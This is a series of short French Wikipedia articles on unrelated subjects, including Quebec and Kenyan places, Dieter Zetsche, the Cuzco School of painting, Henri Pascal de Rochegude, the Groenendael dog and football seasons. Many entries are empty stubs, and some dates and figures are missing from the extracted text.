<doc id="2844362" url="https://fr.wikipedia.org/wiki?curid=2844362" title="Mont Jacob">
Mont Jacob

Le mont Jacob est une montagne québécoise de la région du Saguenay–Lac-Saint-Jean. Point culminant de l'arrondissement Jonquière à Saguenay, le Centre culturel du Mont Jacob y est construit en 1967. Le centre culturel abrite le Centre National d'Exposition, la salle Pierrette-Gaudreault, le théâtre La Rubique et le théâtre Cri.

</doc>
<doc id="2844364" url="https://fr.wikipedia.org/wiki?curid=2844364" title="Nanyuki">
Nanyuki

Nanyuki est une ville de la province de la vallée du Rift du Kenya, au nord-ouest du mont Kenya. L'équateur passe dans les quartiers sud de la ville.
Elle a été fondée en 1907 par des colons britanniques. Elle abrite aujourd'hui la base aérienne principale de la "Kenya Air Force" et une base de la "British Army" qui pratique des exercices annuels sur la montagne et dans les zones arides au nord.
L'économie repose sur le commerce. Les magasins, à l'origine tenus par des Indiens qui constituent encore une part importante de la population, fournissent les fermes et les parcs environnants. La ville est à proximité du point de départ des itinéraires Sirimon et Burguret vers le mont Kenya et possède de nombreux hôtels et restaurants. Le textile représente une activité non négligeable. La ville possède un petit aéroport à 6,5 kilomètres du centre.

</doc>
<doc id="2844365" url="https://fr.wikipedia.org/wiki?curid=2844365" title="Dieter Zetsche">
Dieter Zetsche

Dieter Zetsche né le à Istanbul, Turquie, est un homme d'affaires allemand, ancien président de Daimler, ingénieur de formation. 
Entré dans l'entreprise Daimler en 1976, il y gravit tous les échelons pour en 2006 être nommé PDG du groupe américain Chrysler (fusionné de 1998 à 2007 à Daimler-Benz) puis Daimler (fabricant des voitures Mercedes-Benz, considéré comme leader mondial pour la voiture "haut de gamme" et les camions) . 
Il a redressé le groupe américain qui était en grande difficulté ; on lui attribue aussi l'engagement de profonds changements dans l'entreprise Mercedes-Benz, visant à sortir d'une spirale de baisse de qualité de ses produits et par suite de baisse de satisfaction de ses clients. À la suite des révélations du scandale Volkswagen, il a du gérer pour le compte de son entreprise le scandale du "dieselgate".
Son successeur annoncé (pour 2019) est un Suédois (Ola Källenius) alors directeur de la recherche dans l'entreprise et âgé de , qui devrait réorienter le groupe vers la mobilité électrique.
Éléments de biographie.
Enfance et éducation.
Dieter Zetsche est né le 5 mai 1953 à Istanbul, son père, Herbert Zetsche, étant alors ingénieur civil temporairement en mission en Turquie pour un projet de construction de barrage. 
La famille retournera en Allemagne de l'Ouest trois ans plus tard, en 1956. 
Dieter Zetsche a étudié à Oberursel (près de Francfort-sur-le-Main) avant de poursuivre des études d'électrotechnique de 1971 à 1976 à l'université de Karlsruhe où il obtient son diplôme d'ingénieur. Il a ensuite approfondi son cursus avec un doctorat en ingénierie obtenu en 1982 à l'université de Paderborn.
Depuis 2010, il vit à Lierna sur le lac de Côme, où il a acheté une villa.
Carrière professionnelle.
Dieter Zetsche est connu des médias allemands et du public parmi ses pairs industriels et grands chefs d'entreprises par sa grosse moustache blanche et ses lunettes rondes ; il est réputé à la fois dur et souple, capable de mais aussi de négocier durement les affaires.
Chez Daimler : En 1976, Zetsche est embauché au département de R&amp;D de Daimler-Benz. 
En 1981 il devient directeur adjoint chargé du développement du département "Véhicules" où il s'intéresse notamment à la voiture intelligente (dans un article publié par "Scientific American" en 1995 il prédit des voitures autonomes qui voient, entendent et communiquent entre elles), puis en 1998 devient membre du conseil d’administration de Daimler Chrysler, puis président et chef de la direction du groupe Chrysler (de la mi-2000 au , où il a crédité les opérations américaines de DCX).Le , il a remplace Jürgen Schrempp comme président de DaimlerChrysler (aujourd'hui devenu Daimler AG), succédant aussi à Thomas W. LaSorda au poste de PDG du groupe Chrysler. En 2006, au prix d'une restructuration très dure ( supprimés et six usines fermées) il relance le constructeur américain qui après une série de succès (« entreprise de l'année » en 1996 aux États-Unis) chute en quelques années pour atteindre un déficit d'environ 5 milliards de dollars ; Dieter a été classé dans la liste des les plus influentes de Time Magazine en 2006 et il est réputé avoir été le principal partisan et artisan de la scission de Daimler d'avec Chrysler, rupture effective en 2007, qui a abouti à la création de Daimler AG. En raison des faibles bénéfices de 2012 et de 2013, de la faiblesse des ventes en Chine et des tensions avec les puissants représentants syndicaux allemands en place chez Daimler, son contrat n’a été renouvelé que pour trois ans au lieu des cinq prévus. En 2014 il a néanmoins reçu 14,4 millions d'euros de salaire et de primes, ce qui en fait le second employé le mieux payé de toutes les entreprises allemandes cotées en bourse. 
L'année 2015 est une année record pour les ventes de voitures de l'entreprise, et pour ses bénéfices ; son contrat est alors prolongé jusqu'en 2019.
À l'automne 2018 (le ) il est annoncé que Zetsche quittera son poste de PDG de la société en pour devenir président du conseil de surveillance de Daimler en 2021.
Fin de carrière.
En 2021, à la suite de sa mise en retraite de PDG, et après une période obligatoire de deux ans passé hors de l'entreprise, D. Zetsche devrait présider le conseil de surveillance du groupe, prenant la place de l'industriel allemand Manfred Bischoff (ancien président d'EADS).

</doc>
<doc id="2844367" url="https://fr.wikipedia.org/wiki?curid=2844367" title="Gocé Deltchev">
Gocé Deltchev



</doc>
<doc id="2844373" url="https://fr.wikipedia.org/wiki?curid=2844373" title="Hyères (rivière en Savoie)">
Hyères (rivière en Savoie)



</doc>
<doc id="2844379" url="https://fr.wikipedia.org/wiki?curid=2844379" title="Quatre vallées">
Quatre vallées



</doc>
<doc id="2844382" url="https://fr.wikipedia.org/wiki?curid=2844382" title="Paroissiale">
Paroissiale



</doc>
<doc id="2844384" url="https://fr.wikipedia.org/wiki?curid=2844384" title="Gocé Deltchev (ville)">
Gocé Deltchev (ville)



</doc>
<doc id="2844386" url="https://fr.wikipedia.org/wiki?curid=2844386" title="Échelle de Dvorak">
Échelle de Dvorak



</doc>
<doc id="2844387" url="https://fr.wikipedia.org/wiki?curid=2844387" title="Chaîne pyrénéenne">
Chaîne pyrénéenne



</doc>
<doc id="2844391" url="https://fr.wikipedia.org/wiki?curid=2844391" title="Naro Moru">
Naro Moru

Naro Moru est une ville de la province centrale du Kenya, à quelques dizaines de kilomètres au sud de l'équateur, sur la route entre Nyeri et Nanyuki. Elle est située sur la rivière Naro Moru, sur le versant ouest du mont Kenya. Son activité principale est le tourisme, étant le point de départ d'un des principaux itinéraires vers le sommet.

</doc>
<doc id="2844401" url="https://fr.wikipedia.org/wiki?curid=2844401" title="Locusta">
Locusta

Le mot locusta est originellement une déclinaison (notamment le nominatif singulier) d'un nom latin féminin pouvant signifier « sauterelle » ou « langouste ».
En italien, c'est le singulier d'un nom féminin désignant diverses espèces d'orthoptères grégaires et migrateurs.
Sciences et techniques.
En biologie :

</doc>
<doc id="2844406" url="https://fr.wikipedia.org/wiki?curid=2844406" title="Zucchini">
Zucchini



</doc>
<doc id="2844412" url="https://fr.wikipedia.org/wiki?curid=2844412" title="Dana Wynter">
Dana Wynter

Dana Wynter, née Dagmar Winter le à Berlin (Allemagne) et morte le à Ojai (Californie, États-Unis) est une actrice américano-allemande.
Biographie.
Dana Wynter passe l'essentiel de sa jeunesse en Afrique du Sud, puis au Royaume-Uni et y tourne en 1951-1952 ses premiers films. Puis elle s'établit aux États-Unis en 1953, où elle accomplit la majeure partie de sa carrière, au cinéma et, surtout, à la télévision : elle y joue dans de nombreuses séries et quelques téléfilms, régulièrement jusqu'en 1982, avant une ultime prestation en 1993.
En 1975, pour son dernier rôle au cinéma, elle apparaît dans un film français, "Le Sauvage", avec Catherine Deneuve et Yves Montand.
Au théâtre, elle se produit à Broadway en 1954, dans la pièce "Black-Eyed Susan" d'A. B. Sheffrin, mise en scène par Gregory Ratoff, avec Kay Medford, Vincent Price et Everett Sloane.
Elle est quelquefois créditée « Dagmar Wynter » (voire non créditée) en début de carrière.

</doc>
<doc id="2844414" url="https://fr.wikipedia.org/wiki?curid=2844414" title="Saison 1997-1998 de l'Olympique lyonnais">
Saison 1997-1998 de l'Olympique lyonnais

La saison 1997-1998 de l'Olympique lyonnais est la quarante-huitième de l'histoire du club.
Résumé de la saison.
Pour la première fois depuis 1954, le club sera entraîné par 2 entraîneurs.
Statistiques.
Buteurs de l'OL en championnat :
Effectif professionnel.
" Gardiens :"
" Défenseurs :"
" Milieux :"
" Attaquants :"
Détail des matchs.
Championnat de France.
L'Olympique lyonnais termine le championnat à la avec 53 points.
Coupe de France.
 de finale : 
 de finale : 
 de finale : 
 Quart de finale : 
 Demi-finale : 
Coupe de la Ligue.
 de finale : 
Coupe Intertoto.
 Demi-finale : 
" Match aller : "
" Match retour : "
 Finale : 
" Match aller : "
" Match retour : "
L'Olympique lyonnais remporte la Coupe Intertoto avec un score cumulé en finale de (4 - 2) et obtient son billet pour la Coupe de l'UEFA.
Coupe de l'UEFA.
 de finale : 
" Match aller : "
" Match retour : "
 de finale 
" Match aller : "
" Match retour : "
Malgré la victoire sur la pelouse de l'Inter au match aller, l'OL est éliminé en de finale.

</doc>
<doc id="2844420" url="https://fr.wikipedia.org/wiki?curid=2844420" title="L'inconnue de la Seine">
L'inconnue de la Seine



</doc>
<doc id="2844425" url="https://fr.wikipedia.org/wiki?curid=2844425" title="Maria Antonia Scalera Stellini">
Maria Antonia Scalera Stellini

Maria Antonia Scalera Stellini (née en 1634 à Acquaviva delle Fonti, dans l'actuelle province de Bari, dans la région des Pouilles - morte le à Ariccia) était une poétesse italienne du .
Biographie.
Maria Antonia Scalera était la fille d'un forgeron des Pouilles. Dès son plus jeune âge, elle manifeste une véritable passion pour l'étude de la littérature mais, à l'âge de quatorze ans, elle décide d'entrer au couvent pour éprouver sa foi catholique au monastère de Santa Chiara.
Elle fut membre de l'Académie d'Arcadie, fondée à Rome, en 1690, par des poètes qui avaient appartenu à l’entourage de la reine Christine de Suède, sous le pseudonyme d"'Aricia Gnateaide", où elle habitait en 1674, après le mariage avec Silvestro Stellini, préposé au vestiaire du prince Agostino Chigi.
Elle a écrit en 1667 à Rome, "Li divertimenti poetici" dédiés au cardinal Sigismondo Chigi.

</doc>
<doc id="2844430" url="https://fr.wikipedia.org/wiki?curid=2844430" title="École de Cuzco">
École de Cuzco

LÉcole de Cuzco "(escuela cusqueña)" est un mouvement artistique catholique qui s'est développée dans le vice-royaume du Pérou au cours des , et notamment à Cuzco (ancienne capitale de l'Empire inca), mais également dans d'autres villes des Andes, en Bolivie et en Équateur.
Histoire.
Ce mouvement se développa après la conquête espagnole de l'Empire inca en 1535. Pour la première fois, des techniques artistiques européennes furent enseignées aux Amériques, entre autres par le frère jésuite italien Bernardo Bitti.
Les peintures de l'école de Cuzco sont une forme d'art religieux dont le but principal est catéchétique.
Dans le but de convertir les Incas au catholicisme, les missionnaires firent venir plusieurs artistes religieux à Cuzco. Ils créèrent une école pour les Quechuas et les mestizos (descendants à la fois des Espagnols et des Amérindiens), enseignant le dessin et la peinture à l'huile. La dénomination "cusqueña" n'est pas limitée à la ville de Cuzco ni aux artistes indigènes : des créoles espagnols y participèrent également .
Dans la deuxième moitié du l'évêque de Cuzco, Manuel de Mollinedo y Angulo (1626-1699) fut un guide important des artistes de l'école de Cuzco. Il mit à la disposition des artistes péruviens sa collection d'art européen. Il fut le mécène d'artistes cusqueños comme Basilio Santa Cruz Pumacallao, Antonio Sinchi Roca Inka, and Marcos Rivera.
En 1688, les membres espagnols et mestizos de l'école de Cuzco se séparèrent des peintres indiens. Cette séparation amena de nombreux peintres quechuas à développer leur propre style, fondé sur les œuvres récentes européennes. Ils créèrent également une tradition de peinture des monarques incas, exprimant une fierté culturelle et s'éloignant des thèmes religieux chrétiens.
Style.
Le style de l'école de Cuzco se situe au confluent des influences baroques apportées par les conquérants espagnols et des traditions artistiques indigènes et métisses.
Elle se caractérise par l'emploi, voire l'abus, de couleurs vives et d'or. Les thèmes sont le plus souvent religieux, avec parfois des adaptations aux cultures indigènes. On trouve ainsi des cuys ou des fruits exotiques sur la table d'une "Cène". On trouve quelques rapprochements avec le maniérisme dans le traitement des personnages. Le traitement de la perspective est sommaire, voire inexistant, tandis que les rapports de proportions mettent l'accent sur l'exagération du sujet principal.
Beaucoup de peintures restèrent anonymes, du fait des traditions précolombiennes qui définissaient l'art comme le résultat d'une œuvre commune. L'un des derniers membres de l'école de Cuzco fait exception à cette règle : Marcos Zapata (v 1710-1773). D'autres artistes connus sont Diego Cusihuamán, Gregorio Gamarra, Basilio Santa Cruz Pumacallao
L'école de Cuzco se distingue de l'école de Potosí, bien plus sombre et sanglante, et davantage marquée par le clair-obscur.
Thématique.
Les anges arquebusiers sont un motif populaire dans les peintures de l'école de Cuzco.
La Vierge des Andes est une expression qui désigne les vierges typiques d’Amérique latine comme la Vierge de Bethlem, celle de Copacabana ou celle de Pomata par exemple. La représentation de ce type de vierge est importante pour l’école de Cuzco, car elle permet de faire coexister le culte chrétien et le culte local. En effet, avec ce type d’image, les « […] artistes amérindiens ou métis, [peuvent] s’exprim[er] dans le choix des motifs, des couleurs, des matériaux et des techniques, qui renvoient à des pratiques et à des représentations culturelles autochtones. »

</doc>
<doc id="2844431" url="https://fr.wikipedia.org/wiki?curid=2844431" title="Mickey &quot;One Punch&quot; O'neil">
Mickey &quot;One Punch&quot; O'neil



</doc>
<doc id="2844433" url="https://fr.wikipedia.org/wiki?curid=2844433" title="Aigrette de Chine">
Aigrette de Chine

L'Aigrette de Chine (Egretta eulophotes), quelquefois appelée Aigrette de Swinhoe du nom de son découvreur, est une espèce d'oiseaux aquatiques de la famille des Ardeidae.
Description.
L'Aigrette de Chine mesure de 65 à .
Cette espèce ne présente pas de dimorphisme sexuel.
Alimentation.
Cette espèce se nourrit essentiellement de poissons, de crevettes et de crabes.

</doc>
<doc id="2844434" url="https://fr.wikipedia.org/wiki?curid=2844434" title="Egretta eulophotes">
Egretta eulophotes



</doc>
<doc id="2844442" url="https://fr.wikipedia.org/wiki?curid=2844442" title="Pierre-Olivier Vincent">
Pierre-Olivier Vincent

Pierre-Olivier Vincent est un auteur et dessinateur français.
Biographie.
Pierre-Olivier Vincent commence sa carrière en réalisant diverses couvertures et illustrations pour des revues ("Casus Belli") et des livres (notamment des romans de science-fiction tels que "Raz de marée sur Aquarius" de Monica Hughes). Il travaille également en tant que designer au sein des studios Gaumont.
Son ascension débute réellement lorsqu'il est remarqué et choisi pour travailler à la réalisation de dessins animés et de films d'animation au sein de la DreamWorks Animation (Los Angeles), une division de la célèbre société américaine DreamWorks SKG, créée par Steven Spielberg. Il y débute le et son travail a depuis été reconnu par les Annie Award, cérémonie de référence dans le monde de l'animation.
Pierre-Olivier Vincent fait également partie des illustrateurs de la collection Bibliothèque verte des éditions Hachette.

</doc>
<doc id="2844445" url="https://fr.wikipedia.org/wiki?curid=2844445" title="Damir Čakar">
Damir Čakar

Damir Čakar (en serbe cyrillique : "Дамир Чакар") est un footballeur monténégrin, international yougoslave né le à Pljevlja. Il évoluait au poste d'attaquant. Il est connu pour ses frappes lourdes, sa vitesse limitée et son peu d'appétence pour le repli défensif. 

</doc>
<doc id="2844446" url="https://fr.wikipedia.org/wiki?curid=2844446" title="Henri Pascal de Rochegude">
Henri Pascal de Rochegude

Henri de Paschal (ou Pascal), marquis de Rochegude ("Enric Pascal de Ròchaguda" en occitan), né le et mort le à Albi, dans le Tarn, est un officier de marine, homme politique, romaniste, lexicographe et bibliophile occitan et français.
Biographie.
Carrière militaire.
Henri de Paschal de Rochegude est le fils de François de Paschal de Rochegude et de Rose de Combettes de Caumon. Son grand-père était né Paschal de Saint-Juéry.
Officier de marine sous l'Ancien Régime, Rochegude participe à une mission en Inde en 1768-1769 et à la deuxième expédition aux îles Kerguelen en 1773 : une presqu'île et un lac portent son nom près de Port-Christmas où il débarqua le pour y laisser un message de prise de possession de l'archipel au nom du roi de France. À partir de 1776, il est membre de l'Académie royale de marine. Il patrouille sur l'océan Atlantique pendant la guerre d'indépendance des États-Unis, puis, ayant reçu un brevet de lieutenant de vaisseau, il assure une mission de contrôle à Saint-Domingue de 1785 à 1787.
Carrière politique.
Le , il prononce un discours vibrant à Albi où il critique avec virulence l'administration de l'Ancien Régime.
Mandat à la Constituante.
En 1789, Henri Pascal de Rochegude est élu représentant suppléant de la noblesse pour la sénéchaussée de Carcassonne. Il est admis à siéger le 10 février 1790 à la faveur de la démission de Gabriel d'Upac de Badens.
Il siège sur les bancs de la droite de l'Assemblée nationale constituante. Le 4 mai 1791, il vote contre le rattachement du Comtat Venaissin à la France.
Mandat à la Convention.
La monarchie constitutionnelle, mise en application par la constitution du 3 septembre 1791, prend fin à l'issue de la journée du 10 août 1792 : les bataillons de fédérés bretons et marseillais et les insurgés des faubourgs de Paris prennent le palais des Tuileries. Louis XVI est suspendu et incarcéré, avec sa famille, à la tour du Temple.
En septembre 1792, Henri Pascal de Rochegude est élu député du département du Tarn, le huitième sur neuf, à la Convention nationale.
Le 4 janvier 1793, aux côtés de ses collègues du Comité de la marine, Jean-Jacques Bréard (député de Charente-Inférieure), Nicolas-Joseph Marey (député de la Côte-d'Or), Jean-Pascal Rouyer (député de l'Hérault) et Jacques Taveau (député du Calvados), il est élu membre du Comité de défense générale. Le 22 janvier, aux côtés de Jacques Defermon (député d'Ille-et-Vilaine) et de Claude-Antoine Prieur (député de la Côte-d'Or), il est envoyé en mission « "dans les départements maritimes, depuis Lorient jusqu'à Dunkerque" ».
Il siège sur les bancs de la Plaine. Lors du procès de Louis XVI, il vote « "la détention, et le bannissement à la paix" », et se prononce en faveur de l'appel au peuple et du sursis à l'exécution de la peine. Le 13 avril 1793, il est absent lors du scrutin sur la mise en accusation de Jean-Paul Marat. Le 28 mai, il vote contre le rétablissement de la Commission des Douze.
Mandat aux Cinq-Cents.
Sous le Directoire, Henri Pascal de Rochegude est réélu député et siège au Conseil des Cinq-Cents. Il est tiré au sort pour quitter le Conseil le 1er prairial an VI (le 20 mai 1798). Il n'exerce plus de mandat après sa sortie.
Carrière littéraire.
Passionné de littérature occitane, il est l'un des premiers spécialistes des troubadours et démontre la continuité entre la langue de ceux-ci et la langue occitane moderne. Son "Parnasse occitanien" prêt dès 1797, ne paraît qu'en 1819 ; par manque d'argent, l'auteur ne publie qu'une partie des manuscrits 1 et 1 "bis" conservés à la médiathèque Pierre Amalric d'Albi. La préface, reprise dans l'ouvrage édité, montre l'importance de ces premiers poètes de l'Europe moderne.
Après la Révolution, il se retire à Albi dans l'Hôtel qui abrite ensuite la bibliothèque municipale. Il poursuit ses travaux sur l'occitan des en composant le "Glossaire occitanien pour servir à l'intelligence des poésies des troubadours". C'est un lexique d'environ , comportant les mots les plus difficiles avec leur traduction en français et des citations où ces termes sont employés. Pour écrire ce glossaire, Rochegude a recopié de nombreux manuscrits, poésie et prose, en particulier les de la "Chanson de la croisade" ; en note, il signale l'importance de "La Canso". La préface, largement reprise dans l'ouvrage édité, précise ses sources et développe son opinion sur la formation des langues romanes. Pour effectuer ce travail, il a mis en œuvre sa connaissance du latin, de l'occitan, de l'ancien français, de l'italien, de l'espagnol, du catalan. Toujours par manque d'argent, cet autre ouvrage n'est publié qu'en 1819 dans lequel il postule : 
À la fin du et au début du , Rochegude s'est également consacré aux trouvères. Parmi les manuscrits prêts à être imprimés, conservés à Albi, on trouve un manuscrit, recueil de , plusieurs manuscrits contenant des romans et des textes divers en ancien français. Ce travail, considérable, semble ignoré des spécialistes.
À partir de 1815, Rochegude correspond avec François Raynouard à la demande de ce dernier. Le Secrétaire perpétuel de l'Académie française le presse de publier ses travaux, souhaite bénéficier de ses conseils ; en 1823, il lui demande son aide pour la réalisation du "Lexique roman".
Le , il est élu maître ès jeux de l'Académie des Jeux floraux de Toulouse. À son tour, Raynouard y est admis le mois suivant.
Pendant une trentaine d'années, Rochegude se consacre à l'étude de la langue occitane de son époque. Il entame la rédaction d'un dictionnaire languedocien-français, resté inachevé; en revanche son dictionnaire de rimes languedociennes, environ 13000 entrées, est prêt pour l'impression. On lui doit également un recueil d'expressions typiques occitanes avec une traduction en français ; Christian Laux les a publiées dans la Revue du Tarn en 1989-1990. Le "manuscrit 9" contient 220 textes de la fin du et du début du : des chansons d'amour, des "Noëls", des chansons « politiques » ou grivoises. Certaines ont été publiées.
À sa mort, il lègue son hôtel, son parc et sa bibliothèque (estimée à ) à la ville d'Albi en 1834 qui en prend possession en 1885 ; des livres ont disparu, des ouvrages jugés licencieux ont été brûlés par l'usufruitière ; il en reste . Le fonds Rochegude constitue ainsi la base du fonds ancien de la bibliothèque municipale d'Albi.

</doc>
<doc id="2844449" url="https://fr.wikipedia.org/wiki?curid=2844449" title="Lady Jane (homonymie)">
Lady Jane (homonymie)

Lady Jane peut désigner :

</doc>
<doc id="2844453" url="https://fr.wikipedia.org/wiki?curid=2844453" title="Bluetooth Special Interest Group">
Bluetooth Special Interest Group

 
Le Bluetooth Special Interest Group plus souvent abrégé en SIG est l'organisme qui supervise l'élaboration de normes Bluetooth et octroie les licences de la marque et de la technologie Bluetooth aux fabricants.
Le SIG est fondé en 1998 par Ericsson, Intel, IBM, Nokia et Toshiba.

</doc>
<doc id="2844456" url="https://fr.wikipedia.org/wiki?curid=2844456" title="Année internationale de la pomme de terre">
Année internationale de la pomme de terre

L'année 2008 a été déclarée « Année internationale de la pomme de terre » par les Nations unies, à la demande du Pérou. Parmi les attendus, il est noté que « la pomme de terre est un aliment de base pour toute la population mondiale » et qu'il est souhaitable d'« appeler l’attention de la communauté internationale sur le fait que la pomme de terre peut contribuer largement à assurer la sécurité alimentaire et à atténuer la pauvreté ». L'Organisation des Nations unies pour l'alimentation et l'agriculture (FAO) est chargée de son organisation. L'année internationale de la pomme de terre a été inaugurée officiellement au siège des Nations unies, à New York, le .
Présentation.
La résolution correspondante, adoptée le par la FAO, dont le rôle est de faciliter la célébration de l’Année internationale en collaboration avec les gouvernements, affirme la nécessité de « sensibiliser à nouveau le public aux rapports qui existent entre la pauvreté, la sécurité alimentaire, la malnutrition et la contribution potentielle de la pomme de terre à la lutte contre la faim ».
C'est une des nombreuses manifestations internationales déclarées pour des périodes (jours, mois, ans) spécifiques. L'année 2008 est également l'Année internationale de l'assainissement et l'Année internationale des langues.
On espère que cette désignation d'une année internationale donnera pour la pomme de terre les mêmes résultats que ceux obtenus pour un autre aliment de base lors de l'année internationale du riz en 2004. C'est-à-dire concrètement qu'elle devrait inspirer des expositions, des programmes éducatifs, des films, publications, et provoquer une prise de conscience dans le grand public des efforts entrepris au niveau international pour développer les ressources alimentaires de la planète.
2008 est aussi l'année de la pomme de terre au Pérou.

</doc>
<doc id="2844458" url="https://fr.wikipedia.org/wiki?curid=2844458" title="Berger belge Groenendael">
Berger belge Groenendael

Le groenendael (parfois orthographié grœnendael) est une variété de chien de bergers belges née au début du . L'élevage a commencé par hasard vers 1890. Nicolas Rose, propriétaire du café restaurant « le Château de Groenendael », près de Bruxelles, éleva un chiot noir et obtint une femelle du même type. Ce couple fonda la race. C'est l'une des quatre variétés de la race bergers belges, les autres étant le Tervueren, le Laekenois et le plus connu, le Malinois.
Description.
Groupe 1 : Chiens de berger et de bouvier (sauf bouvier suisse)
Section 1 : Chiens de berger
Le noir zain est la seule couleur acceptée par le standard de la race.
De petites taches blanches non envahissantes sont tolérées au poitrail (étoile) et au bout des pattes.
Caractère.
Souvent vif et éveillé, le Groenendael est comme tous les chiens, un chien qui a besoin d'activité. Certains sujets sont nerveux, comme d'autres bergers belges. C'est un chien doté d'un des meilleurs flairs du monde canin, son intelligence et sa rapidité d'action en font un chien très apprécié.
Utilité.
Au départ, c'est un chien de berger et de bouvier. Il est aujourd'hui apprécié pour la garde et la défense car il défend son maitre auquel il est très attaché, il est aussi un chien de compagnie très apprécié pour sa patience, cependant c'est un chien qui a du caractère et qui est très actif et ne convient donc pas à tous les propriétaires.
Remarque.
Aux États-Unis, le Groenendael est considéré comme une race à part entière, tout comme les trois autres variétés de berger belge, le Tervueren, le Malinois et le Laekenois.

</doc>
<doc id="2844459" url="https://fr.wikipedia.org/wiki?curid=2844459" title="CSN (album)">
CSN (album)

 est le deuxième album studio du trio Crosby, Stills &amp; Nash. Il est sorti en juin 1977 sur le label Atlantic Records.
C'est leur cinquième album ensemble, en comptant ceux qu'ils ont enregistré avec Neil Young. À sa sortie, il se classe des ventes aux États-Unis derrière "Rumours" de Fleetwood Mac.

</doc>
<doc id="2844463" url="https://fr.wikipedia.org/wiki?curid=2844463" title="Lady Jane (film, 2008)">
Lady Jane (film, 2008)

Lady Jane est un film français réalisé par Robert Guédiguian et sorti en 2008.
Commentaires.
Polar au goût amer de crépuscule qui parle du délitement de l'amitié, et de la vengeance qui creuse le sillon de la douleur sans que rien vienne y mettre un terme.

</doc>
<doc id="2844473" url="https://fr.wikipedia.org/wiki?curid=2844473" title="Francesco D. Chiarello">
Francesco D. Chiarello



</doc>
<doc id="2844474" url="https://fr.wikipedia.org/wiki?curid=2844474" title="Alexandre Aliabiev">
Alexandre Aliabiev

Alexandre Aleksandrovitch Aliabiev (en ) né le à Tobolsk et décédé le à Moscou, est un compositeur russe.
Biographie.
Issu d'une famille d'ancienne noblesse, fils d'un sénateur, il apprend la musique très jeune. Fin connaisseur des musiques russes orientales et caucasiennes, il compose sept opéras, plus de 200 romances, des ballets, des vaudevilles et de nombreuses mélodies. Sa romance la plus célèbre est "Soloveï" ("Le Rossignol"), composée sur un poème d'Anton Delvig. Elle fait l'objet de la leçon de chant de l'acte II du "Barbier de Séville" de Rossini ainsi que d'une paraphrase de Liszt ("Deux mélodies russes" S. 250).
Il s'enrôle dans l'armée en 1812 pendant les guerres napoléoniennes, combat en tant qu'officier jusqu'en 1823 et reçoit deux médailles.
Il est arrêté en 1825 après la mort suspecte d'un homme avec lequel il a joué aux cartes pendant toute une nuit, puis exilé en Sibérie en 1828. Libéré en 1843, il réside principalement à Moscou (chez sa femme, boulevard Novinsky) jusqu'à sa mort en 1851.

</doc>
<doc id="2844476" url="https://fr.wikipedia.org/wiki?curid=2844476" title="Brother Beyond">
Brother Beyond

Brother Beyond était un groupe de pop anglais qui eut un certain succès à la fin des années 1980.
Le groupe a eu une carrière éphémère puisqu'il n'a enregistré que deux albums :
Ils ont notamment eu du succès grâce au titre "The Harder I Try" produit et composé par Stock Aitken Waterman, qui ont notamment fait la gloire de Kylie Minogue à la fin des années 1980.
Le groupe s'est séparé en 1991 à la suite de la mésentente des garçons, liée notamment à des problèmes d'argent.
En 2005, "The Very Best Of" est édité en Angleterre; il inclut leur dernier single sorti en 1991 : "The Girl I Used to Know" ne figurant sur aucun album.
Après Brother Beyond….
Nathan Moore a par la suite enregistré quelques albums au sein du groupe Worlds Apart, puis il a enregistré un duo avec Kim Wilde en 2001 "If There Was Love". Il est aussi devenu manager.
Steve Alexander a travaillé avec Duran Duran pendant 6 ans, mais aussi avec Jeff Beck, et enfin il a fondé le projet « Flashmann » avec le chanteur Renn.
Carl Fysh est devenu manager pour le duo anglais Fierce Girl.
David White s'est quant à lui inscrit dans une école d'art et présente ses peintures en Angleterre et en Israël.

</doc>
<doc id="2844480" url="https://fr.wikipedia.org/wiki?curid=2844480" title="Sceau du Delaware">
Sceau du Delaware

Le Sceau de Delaware a été adopté le et légèrement modifié le .
Éléments du sceau.
Au centre du sceau, on voit un blason composé de stries rouges, bleues et blanches. Sur la strie rouge se trouvent une botte de blé et un épi de maïs. Sur la strie blanche est présent un bœuf debout, sur l'herbe. Au-dessus du blason, il y a un voilier. Le blason est soutenu par un fermier à gauche et un soldat à droite.
Inscription.
L'inscription dans la bordure dit ceci : « le grand Sceau de l'État du Delaware » et les dates 1704, 1776 et 1787.
Histoire.
Le sceau a été à l'origine adopté en 1777 avec les modifications mineures faites en 1793, 1847, et 1907. La version actuelle a été adoptée en 2004.

</doc>
<doc id="2844484" url="https://fr.wikipedia.org/wiki?curid=2844484" title="Georgi Joseph">
Georgi Joseph

Georgi Joseph, né le à Paris, est un joueur de basket-ball professionnel français. Il mesure 1,97 m.
Biographie.
Le , l'ASVEL Lyon-Villeurbanne annonce que Joseph n'est pas conservé dans l'effectif.
Le , après avoir participé à la préparation avec Bourg-en-Bresse, il est signé pour la saison. Le , il quitte le club bressan avant la fin de la saison.
Le , il revient à Orléans pour un mois à la suite de la blessure d'Abdel Kader Sylla puis pour le reste de la saison en remplacement d'Ahmad Nivins.
En , il participe à la préparation de l'AS Monaco avec qui il remporte le Tournoi du Golfe à Vannes et signe pour un an.
Le , il prolonge son contrat d'un an avec Monaco.

</doc>
<doc id="2844494" url="https://fr.wikipedia.org/wiki?curid=2844494" title="John Babcock">
John Babcock

John Babcock, né le et décédé le , était le dernier ancien combattant canadien vivant de la Première Guerre mondiale.
Il s'engage durant l'été 1916 dans le corps expéditionnaire canadien. Envoyé en Angleterre, il intègre le « Young Soldiers Battalion », un bataillon de dont un tiers a déjà été au combat. Il s'entraîne sérieusement en prévision des combats. La guerre prend fin avant qu'il n'ait le temps de combattre. Il vivait aux États-Unis, à Spokane dans l'État de Washington. Il meurt à l'âge de .

</doc>
<doc id="2844499" url="https://fr.wikipedia.org/wiki?curid=2844499" title="John F. Babcock">
John F. Babcock



</doc>
<doc id="2844501" url="https://fr.wikipedia.org/wiki?curid=2844501" title="Championnat du Monténégro de football 2006-2007">
Championnat du Monténégro de football 2006-2007

La saison 2006-2007 de Prva Crnogoska Liga est la première édition de la première division monténégrine.
Les clubs participant à cette compétition sont issus de la première division du championnat de Serbie-Monténégro et des deuxième et troisième divisions des clubs monténégrins. Les douze meilleurs clubs de ces divisions se sont affrontés lors d'une série de matchs se déroulant sur toute l'année.
Les douze clubs participants à la première phase de championnat ont été confrontés à deux reprises aux onze autres. En fonction du classement établi au terme de cette première phase, chaque équipe a ensuite affronté une fois de plus les onze autres afin d'attribuer le titre de champion.
C'est le Zeta Golubovci qui a été sacré champion du Monténégro pour la première fois de son histoire.
Trois places étaient qualificatives pour les compétitions européennes, la quatrième place étant celles du vainqueur de la Crnogorski Fudbalski Kup 2006-2007.
Qualifications en coupe d'Europe.
